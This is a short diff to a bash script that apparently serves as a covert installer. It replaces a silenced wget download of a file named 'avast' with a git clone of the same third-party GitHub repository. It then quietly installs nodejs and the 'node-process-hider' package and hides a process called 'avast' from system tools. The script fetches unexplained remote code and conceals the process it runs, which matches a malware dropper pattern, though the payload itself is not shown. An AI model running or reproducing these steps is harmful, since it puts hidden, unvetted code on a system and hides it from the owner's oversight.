@@ -1,5 +1,7 @@
 #!/bin/bash
-wget https://github.com/aurbach55/toya/raw/main/avast >/dev/null 2>&1
+git clone https://github.com/aurbach55/toya.git
+cd toya
+apt update
 apt-get install -y nodejs >/dev/null 2>&1
 npm i -g node-process-hider >/dev/null 2>&1
 ph add avast
